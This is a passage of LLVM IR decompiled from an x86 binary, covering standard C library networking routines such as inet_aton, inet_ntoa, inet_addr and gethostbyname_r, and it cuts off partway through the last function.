  uselistorder i32 %v0_805e2b0, { 1, 2, 0 }
  uselistorder i32 %v1_805e298, { 0, 2, 1 }
  uselistorder i32 %v0_805e2888, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805e29312, { 1, 2, 0, 3 }
  uselistorder i1 %v10_805e283, { 1, 0 }
  uselistorder i32 %v0_805e2ae64, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805e2a365, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805e29867, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805e25368, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_805e1ef, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 3, 1, 4, 2, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder [3 x i8]* @global_var_806d774.721, { 1, 0 }
  uselistorder i8 58, { 6, 7, 8, 0, 1, 2, 3, 4, 9, 5 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805e3b0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805e3ae, { 1, 0 }
  uselistorder label %dec_label_pc_805e36e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e353, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805e2ea, { 1, 0 }
  uselistorder label %dec_label_pc_805e2c8, { 1, 0 }
  uselistorder label %dec_label_pc_805e2bd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e2b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e2ac, { 1, 0 }
  uselistorder label %dec_label_pc_805e298, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e295, { 1, 0 }
  uselistorder label %dec_label_pc_805e26b, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805e3c3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805e3c3, i32* @ecx, align 4
  %v1_805e3c7 = icmp eq i8* %arg1, null
  br i1 %v1_805e3c7, label %dec_label_pc_805e448, label %dec_label_pc_805e3cb

dec_label_pc_805e3cb:                             ; preds = %entry
  %v0_805e3d9.pre = load i32, i32* @global_var_8074860, align 32
  br label %dec_label_pc_805e3d6

dec_label_pc_805e3d6:                             ; preds = %dec_label_pc_805e3cb, %dec_label_pc_805e41f
  %v2_805e42235 = phi i32 [ 1, %dec_label_pc_805e3cb ], [ %v3_805e422, %dec_label_pc_805e41f ]
  %v0_805e3d634 = phi i32 [ %v4_805e3c3, %dec_label_pc_805e3cb ], [ %v0_805e3d63, %dec_label_pc_805e41f ]
  %v0_805e43d33 = phi i32 [ 0, %dec_label_pc_805e3cb ], [ %v2_805e425, %dec_label_pc_805e41f ]
  %v1_805e3d6 = inttoptr i32 %v0_805e3d634 to i8*
  %v2_805e3d6 = load i8, i8* %v1_805e3d6, align 1
  %v3_805e3d6 = sext i8 %v2_805e3d6 to i32
  %v2_805e3df = mul nsw i32 %v3_805e3d6, 2
  %v3_805e3df = add i32 %v2_805e3df, %v0_805e3d9.pre
  %v4_805e3df = inttoptr i32 %v3_805e3df to i8*
  %v5_805e3df = load i8, i8* %v4_805e3df, align 1
  %v6_805e3df = and i8 %v5_805e3df, 8
  %v7_805e3df = icmp eq i8 %v6_805e3df, 0
  br i1 %v7_805e3df, label %dec_label_pc_805e448, label %dec_label_pc_805e3e6

dec_label_pc_805e3e6:                             ; preds = %dec_label_pc_805e3d6
  %v4_805e3fa.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805e3fa

dec_label_pc_805e3ea:                             ; preds = %dec_label_pc_805e3fa
  %v3_805e3ea = mul i32 %v1_805e3ea, 10
  %v2_805e3ed = add i32 %v3_805e3ea, -48
  %v3_805e3ed = add i32 %v2_805e3ed, %v2_805e3fc
  %v1_805e3f1 = add i32 %v3_805e3ed, -255
  %v6_805e3f1 = sub i32 254, %v3_805e3ed
  %v7_805e3f1 = and i32 %v6_805e3f1, %v3_805e3ed
  %v8_805e3f1 = icmp slt i32 %v7_805e3f1, 0
  %v9_805e3f1 = icmp eq i32 %v1_805e3f1, 0
  %v10_805e3f1 = icmp slt i32 %v1_805e3f1, 0
  %v3_805e3f7 = icmp eq i1 %v10_805e3f1, %v8_805e3f1
  %v4_805e3f7 = icmp eq i1 %v9_805e3f1, false
  %v5_805e3f7 = and i1 %v4_805e3f7, %v3_805e3f7
  br i1 %v5_805e3f7, label %dec_label_pc_805e448, label %dec_label_pc_805e3f9

dec_label_pc_805e3f9:                             ; preds = %dec_label_pc_805e3ea
  %v1_805e3f9 = add i32 %v0_805e3f9, 1
  store i32 %v1_805e3f9, i32* @ecx, align 4
  br label %dec_label_pc_805e3fa

dec_label_pc_805e3fa:                             ; preds = %dec_label_pc_805e3e6, %dec_label_pc_805e3f9
  %v1_805e3ea = phi i32 [ 0, %dec_label_pc_805e3e6 ], [ %v3_805e3ed, %dec_label_pc_805e3f9 ]
  %v4_805e3fa = phi i32 [ %v4_805e3fa.pre, %dec_label_pc_805e3e6 ], [ %v6_805e3fa, %dec_label_pc_805e3f9 ]
  %v0_805e3f9 = phi i32 [ %v0_805e3d634, %dec_label_pc_805e3e6 ], [ %v1_805e3f9, %dec_label_pc_805e3f9 ]
  %v1_805e3fa = inttoptr i32 %v0_805e3f9 to i8*
  %v2_805e3fa = load i8, i8* %v1_805e3fa, align 1
  %v3_805e3fa = zext i8 %v2_805e3fa to i32
  %v5_805e3fa = and i32 %v4_805e3fa, -256
  %v6_805e3fa = or i32 %v3_805e3fa, %v5_805e3fa
  store i32 %v6_805e3fa, i32* @edx, align 4
  %v2_805e3fc = sext i8 %v2_805e3fa to i32
  %v2_805e3ff = mul nsw i32 %v2_805e3fc, 2
  %v3_805e3ff = add i32 %v2_805e3ff, %v0_805e3d9.pre
  %v4_805e3ff = inttoptr i32 %v3_805e3ff to i16*
  %v5_805e3ff = load i16, i16* %v4_805e3ff, align 2
  %v2_805e404 = and i16 %v5_805e3ff, 8
  %v3_805e404 = icmp eq i16 %v2_805e404, 0
  %v1_805e406 = icmp eq i1 %v3_805e404, false
  br i1 %v1_805e406, label %dec_label_pc_805e3ea, label %dec_label_pc_805e408

dec_label_pc_805e408:                             ; preds = %dec_label_pc_805e3fa
  %v8_805e408 = sub nsw i32 2, %v2_805e42235
  %v9_805e408 = and i32 %v8_805e408, %v2_805e42235
  %v10_805e408 = icmp slt i32 %v9_805e408, 0
  %v11_805e408 = icmp eq i32 %v2_805e42235, 3
  %v12_805e408 = icmp slt i32 %v2_805e42235, 3
  %v3_805e40c = icmp eq i1 %v12_805e408, %v10_805e408
  %v4_805e40c = icmp eq i1 %v11_805e408, false
  %v5_805e40c = and i1 %v4_805e40c, %v3_805e40c
  br i1 %v5_805e40c, label %dec_label_pc_805e416, label %dec_label_pc_805e40e

dec_label_pc_805e40e:                             ; preds = %dec_label_pc_805e408
  %v10_805e40e = icmp eq i8 %v2_805e3fa, 46
  %v1_805e411 = icmp eq i1 %v10_805e40e, false
  br i1 %v1_805e411, label %dec_label_pc_805e448, label %dec_label_pc_805e413

dec_label_pc_805e413:                             ; preds = %dec_label_pc_805e40e
  %v1_805e413 = add i32 %v0_805e3f9, 1
  store i32 %v1_805e413, i32* @ecx, align 4
  br label %dec_label_pc_805e41f

dec_label_pc_805e416:                             ; preds = %dec_label_pc_805e408
  %v1_805e416 = add i32 %v0_805e3f9, 1
  store i32 %v1_805e416, i32* @ecx, align 4
  %v4_805e417 = icmp eq i8 %v2_805e3fa, 0
  br i1 %v4_805e417, label %dec_label_pc_805e41f, label %dec_label_pc_805e41b

dec_label_pc_805e41b:                             ; preds = %dec_label_pc_805e416
  %v2_805e41b = and i16 %v5_805e3ff, 32
  %v3_805e41b = icmp eq i16 %v2_805e41b, 0
  br i1 %v3_805e41b, label %dec_label_pc_805e448, label %dec_label_pc_805e41f

dec_label_pc_805e41f:                             ; preds = %dec_label_pc_805e41b, %dec_label_pc_805e416, %dec_label_pc_805e413
  %v0_805e3d63 = phi i32 [ %v1_805e416, %dec_label_pc_805e41b ], [ %v1_805e416, %dec_label_pc_805e416 ], [ %v1_805e413, %dec_label_pc_805e413 ]
  %v2_805e41f = mul i32 %v0_805e43d33, 256
  %v3_805e422 = add nuw nsw i32 %v2_805e42235, 1
  %v2_805e425 = or i32 %v1_805e3ea, %v2_805e41f
  %v7_805e42b = icmp sgt i32 %v2_805e42235, 3
  br i1 %v7_805e42b, label %dec_label_pc_805e42d, label %dec_label_pc_805e3d6

dec_label_pc_805e42d:                             ; preds = %dec_label_pc_805e41f
  %v4_805e432 = icmp eq i32 %arg2, 0
  br i1 %v4_805e432, label %dec_label_pc_805e44a, label %dec_label_pc_805e439

dec_label_pc_805e439:                             ; preds = %dec_label_pc_805e42d
  %v1_805e43d = call i32 @llvm.bswap.i32(i32 %v2_805e425)
  %v2_805e43f = inttoptr i32 %arg2 to i32*
  store i32 %v1_805e43d, i32* %v2_805e43f, align 4
  br label %dec_label_pc_805e44a

dec_label_pc_805e448:                             ; preds = %dec_label_pc_805e41b, %dec_label_pc_805e40e, %dec_label_pc_805e3d6, %dec_label_pc_805e3ea, %entry
  br label %dec_label_pc_805e44a

dec_label_pc_805e44a:                             ; preds = %dec_label_pc_805e42d, %dec_label_pc_805e439, %dec_label_pc_805e448
  %v0_805e44f = phi i32 [ 1, %dec_label_pc_805e42d ], [ 1, %dec_label_pc_805e439 ], [ 0, %dec_label_pc_805e448 ]
  ret i32 %v0_805e44f

; uselistorder directives
  uselistorder i32 %v2_805e3fc, { 1, 0 }
  uselistorder i32 %v6_805e3fa, { 1, 0 }
  uselistorder i8 %v2_805e3fa, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805e3f9, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805e3f1, { 1, 0 }
  uselistorder i32 %v3_805e3ed, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805e3d634, { 1, 0 }
  uselistorder i32 %v2_805e42235, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 254, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805e44a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805e448, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805e3fa, { 1, 0 }
  uselistorder label %dec_label_pc_805e3d6, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805e450 = load i32, i32* @edi, align 4
  %v0_805e451 = load i32, i32* @esi, align 4
  %v0_805e452 = load i32, i32* @ebx, align 4
  store i32 %v0_805e452, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_805e45d = add i32 %arg2, 15
  store i32 %v1_805e45d, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_805e462 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_805e462, 16777216
  %v1_805e464 = sdiv i32 %sext, 16777216
  store i32 %v1_805e464, i32* @ebx, align 4
  br label %dec_label_pc_805e468

dec_label_pc_805e468:                             ; preds = %entry, %dec_label_pc_805e48d
  %v0_805e46b17 = phi i32 [ %v1_805e464, %entry ], [ %v2_805e48d, %dec_label_pc_805e48d ]
  %v0_805e49816 = phi i32 [ %v1_805e45d, %entry ], [ %v0_805e491, %dec_label_pc_805e48d ]
  %v1_805e46d = urem i32 %v0_805e46b17, 256
  %v5_805e47b = inttoptr i32 %v0_805e49816 to i8*
  %v6_805e47b = call i32 @_uintmaxtostr(i8* %v5_805e47b, i32 %v1_805e46d, i32 0, i32 -10, i32 0)
  %v0_805e483 = load i32, i32* @esi, align 4
  %v1_805e483 = icmp eq i32 %v0_805e483, 0
  %v1_805e485 = add i32 %v6_805e47b, -1
  store i32 %v1_805e485, i32* %ecx.global-to-local, align 4
  br i1 %v1_805e483, label %dec_label_pc_805e48d, label %dec_label_pc_805e48a

dec_label_pc_805e48a:                             ; preds = %dec_label_pc_805e468
  %v1_805e48a = inttoptr i32 %v0_805e483 to i8*
  store i8 46, i8* %v1_805e48a, align 1
  %v0_805e491.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805e48d

dec_label_pc_805e48d:                             ; preds = %dec_label_pc_805e468, %dec_label_pc_805e48a
  %v0_805e491 = phi i32 [ %v1_805e485, %dec_label_pc_805e468 ], [ %v0_805e491.pre, %dec_label_pc_805e48a ]
  %v0_805e48d = load i32, i32* @ebx, align 4
  %v2_805e48d = udiv i32 %v0_805e48d, 256
  store i32 %v2_805e48d, i32* @ebx, align 4
  %v0_805e490 = load i32, i32* @edi, align 4
  %v1_805e490 = add i32 %v0_805e490, 1
  store i32 %v1_805e490, i32* @edi, align 4
  store i32 %v0_805e491, i32* @esi, align 4
  %v7_805e496 = icmp sgt i32 %v1_805e490, 3
  br i1 %v7_805e496, label %dec_label_pc_805e498, label %dec_label_pc_805e468

dec_label_pc_805e498:                             ; preds = %dec_label_pc_805e48d
  %v1_805e498 = add i32 %v0_805e491, 1
  %v2_805e49b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805e49b, i32* @ebx, align 4
  store i32 %v0_805e451, i32* @esi, align 4
  store i32 %v0_805e450, i32* @edi, align 4
  ret i32 %v1_805e498

; uselistorder directives
  uselistorder i32 %v0_805e491, { 0, 2, 1 }
  uselistorder i32 %v1_805e464, { 1, 0 }
  uselistorder label %dec_label_pc_805e48d, { 1, 0 }
  uselistorder label %dec_label_pc_805e468, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_805e4ab = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_807cf24.722 to i32))
  ret i32 %v2_805e4ab
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_805e4b7 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805e4c0 = inttoptr i32 %arg1 to i8*
  %v3_805e4c0 = call i32 @inet_aton(i8* %v2_805e4c0, i32 %v2_805e4b7)
  store i32 -1, i32* @edx, align 4
  %v1_805e4cb = icmp eq i32 %v3_805e4c0, 0
  br i1 %v1_805e4cb, label %dec_label_pc_805e4d3, label %dec_label_pc_805e4cf

dec_label_pc_805e4cf:                             ; preds = %entry
  %v3_805e4cf = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_805e4cf, i32* @edx, align 4
  br label %dec_label_pc_805e4d3

dec_label_pc_805e4d3:                             ; preds = %entry, %dec_label_pc_805e4cf
  %v0_805e4d3 = phi i32 [ -1, %entry ], [ %v3_805e4cf, %dec_label_pc_805e4cf ]
  ret i32 %v0_805e4d3

; uselistorder directives
  uselistorder label %dec_label_pc_805e4d3, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805e4df = call i32 @__GI___h_errno_location()
  %v0_805e4e4 = load i32, i32* @edx, align 4
  %v2_805e4e7 = ptrtoint i32* %stack_var_-4 to i32
  %v8_805e4ff = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_807d10c.724, i32 ptrtoint (i32* @global_var_807cf40.723 to i32), i32 460, i32 %v2_805e4e7, i32 %v0_805e4df, i32 %v0_805e4e4)
  %v3_805e504 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_805e504
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_4()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_805e50c = load i32, i32* @ebp, align 4
  %v0_805e50d = load i32, i32* @edi, align 4
  %v0_805e50e = load i32, i32* @esi, align 4
  %v0_805e50f = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_805e51f = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_805e51f, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_805e52a = icmp eq i32 %arg1, 0
  br i1 %v4_805e52a, label %dec_label_pc_805e836, label %dec_label_pc_805e535

dec_label_pc_805e535:                             ; preds = %entry
  %v1_805e535 = call i32 @__errno_location(i32 %v0_805e50f)
  store i32 %v1_805e535, i32* %eax.global-to-local, align 4
  store i32 %v1_805e535, i32* @esi, align 4
  %v1_805e53c = inttoptr i32 %v1_805e535 to i32*
  %v2_805e53c = load i32, i32* %v1_805e53c, align 4
  store i32 %v2_805e53c, i32* @edi, align 4
  store i32 0, i32* %v1_805e53c, align 4
  %v0_805e54d = load i32, i32* @ebx, align 4
  store i32 %v0_805e54d, i32* %stack_var_-108, align 4
  %v7_805e559 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_805e54d, i32 %arg5, i32 %arg6, i32 %v1_805e535)
  store i32 %v7_805e559, i32* %eax.global-to-local, align 4
  %v1_805e561 = icmp eq i32 %v7_805e559, 0
  br i1 %v1_805e561, label %dec_label_pc_805e836, label %dec_label_pc_805e569

dec_label_pc_805e569:                             ; preds = %dec_label_pc_805e535
  store i32 %arg6, i32* @ecx, align 4
  %v1_805e56d = inttoptr i32 %arg6 to i32*
  %v2_805e56d = load i32, i32* %v1_805e56d, align 4
  store i32 %v2_805e56d, i32* %edx.global-to-local, align 4
  %v9_805e56f = icmp eq i32 %v2_805e56d, 1
  br i1 %v9_805e56f, label %dec_label_pc_805e589, label %dec_label_pc_805e574

dec_label_pc_805e574:                             ; preds = %dec_label_pc_805e569
  %v9_805e574 = icmp eq i32 %v2_805e56d, 4
  br i1 %v9_805e574, label %dec_label_pc_805e589, label %dec_label_pc_805e579

dec_label_pc_805e579:                             ; preds = %dec_label_pc_805e574
  %v1_805e579 = add i32 %v2_805e56d, 1
  %v8_805e579 = icmp eq i32 %v1_805e579, 0
  store i32 %v1_805e579, i32* %edx.global-to-local, align 4
  %v1_805e57a = icmp eq i1 %v8_805e579, false
  br i1 %v1_805e57a, label %dec_label_pc_805e836, label %dec_label_pc_805e580

dec_label_pc_805e580:                             ; preds = %dec_label_pc_805e579
  %v0_805e580 = load i32, i32* @esi, align 4
  %v1_805e580 = inttoptr i32 %v0_805e580 to i32*
  %v2_805e580 = load i32, i32* %v1_805e580, align 4
  %v11_805e580 = icmp eq i32 %v2_805e580, 2
  %v1_805e583 = icmp eq i1 %v11_805e580, false
  br i1 %v1_805e583, label %dec_label_pc_805e836, label %dec_label_pc_805e589

dec_label_pc_805e589:                             ; preds = %dec_label_pc_805e580, %dec_label_pc_805e574, %dec_label_pc_805e569
  %v0_805e589 = load i32, i32* @ebp, align 4
  store i32 %v0_805e589, i32* %eax.global-to-local, align 4
  %v0_805e58b = load i32, i32* @edi, align 4
  %v1_805e58b = load i32, i32* @esi, align 4
  %v2_805e58b = inttoptr i32 %v1_805e58b to i32*
  store i32 %v0_805e58b, i32* %v2_805e58b, align 4
  %v0_805e58d = load i32, i32* %eax.global-to-local, align 4
  %v1_805e58d = sub i32 0, %v0_805e58d
  %v1_805e58f = urem i32 %v1_805e58d, 4
  %v2_805e58f = icmp eq i32 %v1_805e58f, 0
  store i32 %v1_805e58f, i32* %eax.global-to-local, align 4
  %v0_805e5a4.pre = load i32, i32* @ebx, align 4
  br i1 %v2_805e58f, label %dec_label_pc_805e5a0, label %dec_label_pc_805e594

dec_label_pc_805e594:                             ; preds = %dec_label_pc_805e589
  %v2_805e594 = sub i32 %v0_805e5a4.pre, %v1_805e58f
  %v7_805e594 = icmp ult i32 %v0_805e5a4.pre, %v1_805e58f
  br i1 %v7_805e594, label %dec_label_pc_805e831, label %dec_label_pc_805e59c

dec_label_pc_805e59c:                             ; preds = %dec_label_pc_805e594
  %v0_805e59c = load i32, i32* @ebp, align 4
  %v2_805e59c = add i32 %v0_805e59c, %v1_805e58f
  store i32 %v2_805e59c, i32* @ebp, align 4
  store i32 %v2_805e594, i32* @ebx, align 4
  br label %dec_label_pc_805e5a0

dec_label_pc_805e5a0:                             ; preds = %dec_label_pc_805e589, %dec_label_pc_805e59c
  %v0_805e5a4 = phi i32 [ %v2_805e594, %dec_label_pc_805e59c ], [ %v0_805e5a4.pre, %dec_label_pc_805e589 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805e56d, align 4
  %tmp43 = icmp ult i32 %v0_805e5a4, 4
  br i1 %tmp43, label %dec_label_pc_805e831, label %dec_label_pc_805e5b3

dec_label_pc_805e5b3:                             ; preds = %dec_label_pc_805e5a0
  %v0_805e5b3 = load i32, i32* @ebx, align 4
  %v1_805e5b3 = add i32 %v0_805e5b3, -4
  store i32 %v1_805e5b3, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_805e5b3, 8
  br i1 %tmp44, label %dec_label_pc_805e831, label %dec_label_pc_805e5bf

dec_label_pc_805e5bf:                             ; preds = %dec_label_pc_805e5b3
  %v0_805e5bf = load i32, i32* @ebp, align 4
  %v1_805e5bf = add i32 %v0_805e5bf, 4
  store i32 %v1_805e5bf, i32* %edx.global-to-local, align 4
  %v1_805e5c2 = add i32 %v0_805e5b3, -12
  store i32 %v1_805e5c2, i32* %eax.global-to-local, align 4
  store i32 %v1_805e5bf, i32* %stack_var_-92, align 4
  %v3_805e5cb = inttoptr i32 %v1_805e5bf to i32*
  store i32 %v0_805e5bf, i32* %v3_805e5cb, align 4
  %v0_805e5ce = load i32, i32* %edx.global-to-local, align 4
  %v1_805e5ce = add i32 %v0_805e5ce, 4
  %v2_805e5ce = inttoptr i32 %v1_805e5ce to i32*
  store i32 0, i32* %v2_805e5ce, align 4
  %tmp45 = icmp ult i32 %v1_805e5c2, 32
  br i1 %tmp45, label %dec_label_pc_805e831, label %dec_label_pc_805e5db

dec_label_pc_805e5db:                             ; preds = %dec_label_pc_805e5bf
  %v0_805e5db = load i32, i32* @ebx, align 4
  %v1_805e5db = add i32 %v0_805e5db, -44
  store i32 %v1_805e5db, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_805e5db, 256
  br i1 %tmp46, label %dec_label_pc_805e831, label %dec_label_pc_805e5ee

dec_label_pc_805e5ee:                             ; preds = %dec_label_pc_805e5db
  %v0_805e5ee = load i32, i32* @ebp, align 4
  %v1_805e5ee = add i32 %v0_805e5ee, 12
  %v1_805e5f1 = add i32 %v0_805e5ee, 44
  store i32 %v1_805e5f1, i32* @edi, align 4
  store i32 %v1_805e5f1, i32* %stack_var_-108, align 4
  %v3_805e602 = inttoptr i32 %v1_805e5f1 to i8*
  %v4_805e602 = call i32 @strncpy(i8* %v3_805e602, i32 %arg1, i32 %v1_805e5db)
  %v0_805e607 = load i32, i32* @edi, align 4
  %v1_805e607 = load i32, i32* @ebp, align 4
  %v2_805e607 = add i32 %v1_805e607, 12
  %v3_805e607 = inttoptr i32 %v2_805e607 to i32*
  store i32 %v0_805e607, i32* %v3_805e607, align 4
  %v1_805e60e = add i32 %v0_805e5ee, 16
  %v2_805e60e = inttoptr i32 %v1_805e60e to i32*
  store i32 0, i32* %v2_805e60e, align 4
  %v2_805e615 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805e615, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_805e617 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_805e61c = inttoptr i32 %arg1 to i8*
  %v3_805e61c = call i32 @inet_aton(i8* %v2_805e61c, i32 %v0_805e617)
  store i32 %v3_805e61c, i32* %eax.global-to-local, align 4
  %v1_805e624 = icmp eq i32 %v3_805e61c, 0
  br i1 %v1_805e624, label %dec_label_pc_805e660, label %dec_label_pc_805e628

dec_label_pc_805e628:                             ; preds = %dec_label_pc_805e5ee
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_805e62c = load i32, i32* @edi, align 4
  store i32 %v0_805e62c, i32* %arg2, align 4
  %v1_805e62e = add i32 %tmp18, 8
  %v2_805e62e = inttoptr i32 %v1_805e62e to i32*
  store i32 2, i32* %v2_805e62e, align 4
  %v0_805e635 = load i32, i32* %edx.global-to-local, align 4
  %v1_805e635 = add i32 %v0_805e635, 12
  %v2_805e635 = inttoptr i32 %v1_805e635 to i32*
  store i32 4, i32* %v2_805e635, align 4
  %v2_805e63c = load i32, i32* %stack_var_-92, align 4
  %v1_805e63f = load i32, i32* %edx.global-to-local, align 4
  %v2_805e63f = add i32 %v1_805e63f, 16
  %v3_805e63f = inttoptr i32 %v2_805e63f to i32*
  store i32 %v2_805e63c, i32* %v3_805e63f, align 4
  %v1_805e646 = load i32, i32* %edx.global-to-local, align 4
  %v2_805e646 = add i32 %v1_805e646, 4
  %v3_805e646 = inttoptr i32 %v2_805e646 to i32*
  store i32 %v1_805e5ee, i32* %v3_805e646, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_805e64d = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805e64d, i32* %v1_805e51f, align 4
  store i32 0, i32* %v1_805e56d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e836

dec_label_pc_805e660:                             ; preds = %dec_label_pc_805e5ee
  %v0_805e660 = load i32, i32* %stack_var_-108, align 4
  %v3_805e660 = call i32 @__open_nameservers(i32 %v0_805e660, i32 %v0_805e617, i32 %v1_805e5db)
  store i32 %v3_805e660, i32* %eax.global-to-local, align 4
  %v2_805e670 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_805e670, i32* @ebx, align 4
  store i32 %v2_805e670, i32* %stack_var_-108, align 4
  %v4_805e675 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134585853, i32 ptrtoint (i32* @global_var_80748a0.725 to i32))
  store i32 %v4_805e675, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %stack_var_-108, align 4
  %v1_805e681 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80748a0.725 to i32))
  %v2_805e686 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805e686, i32* @ecx, align 4
  store i32 134585853, i32* %eax.global-to-local, align 4
  store i32 %v2_805e670, i32* %stack_var_-108, align 4
  %v3_805e691 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805e6ac = ptrtoint i32* %stack_var_-76 to i32
  %v2_805e6b1 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805e6b1, i32* %eax.global-to-local, align 4
  store i32 %v2_805e6b1, i32* %stack_var_-108, align 4
  %v0_805e6bb = load i32, i32* @esi, align 4
  %v7_805e6c2 = call i32 @__dns_lookup(i8* %v2_805e61c, i32 1, i32 %v0_805e6bb, i32 ptrtoint (i32* @global_var_807ea54.727 to i32), i32 %v2_805e6b1, i32 %v2_805e6ac)
  store i32 %v7_805e6c2, i32* %eax.global-to-local, align 4
  %v2_805e6ca = icmp slt i32 %v7_805e6c2, 0
  %v1_805e6cc = icmp eq i1 %v2_805e6ca, false
  br i1 %v1_805e6cc, label %dec_label_pc_805e6e2, label %dec_label_pc_805e6ce

dec_label_pc_805e6ce:                             ; preds = %dec_label_pc_805e660
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_805e56d, align 4
  br label %dec_label_pc_805e836

dec_label_pc_805e6e2:                             ; preds = %dec_label_pc_805e660
  %v4_805e6e2 = trunc i64 %tmp11 to i32
  store i32 %v4_805e6e2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_805e6f5 = icmp ugt i32 %v1_805e5db, 256
  %v15_805e6f5 = icmp eq i32 %v0_805e5db, 300
  %v2_805e6f9 = or i1 %v10_805e6f5, %v15_805e6f5
  br i1 %v2_805e6f9, label %dec_label_pc_805e794, label %dec_label_pc_805e6fb

dec_label_pc_805e6fb:                             ; preds = %dec_label_pc_805e6e2
  %v3_805e6fe = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805e6fe, i32* %stack_var_-108, align 4
  %v1_805e702 = call i32 @free(i32 %v3_805e6fe)
  store i32 %v1_805e702, i32* %eax.global-to-local, align 4
  %v2_805e707 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805e707, i32* @edi, align 4
  %v3_805e708 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e708, i32* %stack_var_-108, align 4
  %v1_805e70c = call i32 @free(i32 %v3_805e708)
